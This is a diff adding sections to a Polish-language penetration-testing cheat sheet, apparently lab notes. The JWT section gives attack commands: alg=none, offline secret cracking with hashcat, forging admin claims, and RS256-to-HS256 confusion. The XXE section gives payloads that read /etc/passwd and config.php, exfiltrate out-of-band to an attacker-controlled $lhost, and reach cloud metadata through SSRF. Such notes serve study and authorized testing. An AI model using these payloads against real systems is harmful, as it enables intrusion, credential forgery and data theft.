@@ -1069,7 +1069,22 @@ curl -d '{"password":"lab","username":"pwn"}' -H 'Content-Type: application/json
 curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
   -H 'Authorization: Bearer <JWT>' http://$IP:5002/users/v1/admin/password
 ```
-> Sprawdzaj: **IDOR/BOLA** (podmień ID w ścieżce), brak autoryzacji na `/admin/*`, **JWT** (`jwt_tool`, słaby sekret → `hashcat -m 16500`), nadmiarowe pola w JSON. Zawsze `curl -i` — czytaj nagłówki i kody.
+> Sprawdzaj: **IDOR/BOLA** (podmień ID w ścieżce), brak autoryzacji na `/admin/*`, **JWT** (poniżej), nadmiarowe pola w JSON. Zawsze `curl -i` — czytaj nagłówki i kody.
+
+**JWT — ataki (token w 3 częściach `header.payload.signature`, base64url):**
+```bash
+# Rozkoduj bez weryfikacji (zobacz alg + roszczenia):
+jwt_tool <JWT>                                        # albo: echo <part> | base64 -d
+# 1. alg=none — usun podpis, ustaw "alg":"none" (gdy serwer to akceptuje):
+jwt_tool <JWT> -X a
+# 2. Slaby sekret HS256 -> zlam offline i podpisz swoj token (np. admin=true):
+hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt
+jwt_tool <JWT> -S hs256 -p '<zlamany_sekret>' -T     # -T = edytuj roszczenia interaktywnie
+# 3. Podmiana roszczenia (po zlamaniu sekretu): user->admin, id->1, role->administrator
+# 4. RS256->HS256 confusion: podpisz HS256 uzywajac PUBLICZNEGO klucza serwera jako sekretu:
+jwt_tool <JWT> -X k -pk public.pem
+```
+> Kolejność: rozkoduj → spróbuj `alg=none` → złam sekret (`-m 16500`) → podmień roszczenia. Publiczny klucz często leży pod `/jwks.json`, w cert TLS, albo w repo.
 
 ## 2.16 AV/EDR evasion — koncepcja (BEZ gotowców)
 
@@ -1104,6 +1119,33 @@ curl -X PUT -d '{"password":"newpass"}' -H 'Content-Type: application/json' \
 - *EDR unhooking / behavior*: omijanie hooków user-mode — vs telemetria kernel/ETW.
 
 > ℹ️ **Rozpoznanie środowiska (legalne, nieofensywne):** `Get-MpComputerStatus` (Defender wł.?), `Get-MpPreference | Select Exclusion*` (ścieżki wykluczone ze skanu — częsty misconfig do zaraportowania), `sc query windefend`, lista usług EDR w procesach. To enumeracja, nie obejście.
+
+---
+
+## 2.17 XXE (XML External Entity)
+
+> Gdy apka parsuje XML (upload `.xml`/`.svg`/`.docx`, SOAP, feed) i nie wyłączy encji zewnętrznych → **czytanie plików**, SSRF, czasem RCE. Trop: request z `Content-Type: application/xml` lub pole, które przyjmuje XML.
+
+**Odczyt pliku (classic):**
+```xml
+<?xml version="1.0"?>
+<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
+<root><data>&xxe;</data></root>
+<!-- wstrzyknij tam, gdzie apka odbija wartosc; &xxe; podstawi tresc pliku -->
+```
+**Blind/out-of-band (gdy output niewidoczny)** — wyślij dane na swój serwer:
+```xml
+<!DOCTYPE foo [
+  <!ENTITY % ext SYSTEM "http://$lhost:8000/evil.dtd"> %ext; ]>
+<!-- evil.dtd na Twoim serwerze: -->
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://$lhost:8000/?d=%file;'>"> %all;
+```
+**PHP + większe pliki / źródła** — owiń w `php://filter` (base64), inaczej znaki XML psują parser:
+```xml
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/config.php">
+```
+> SSRF przez XXE: `SYSTEM "http://169.254.169.254/..."` (chmura/IMDS) lub wewnętrzny host. RCE tylko gdy jest rozszerzenie `expect` (`expect://id`). Nasłuch OOB: `python3 -m http.server 8000`.
 
 ---
 
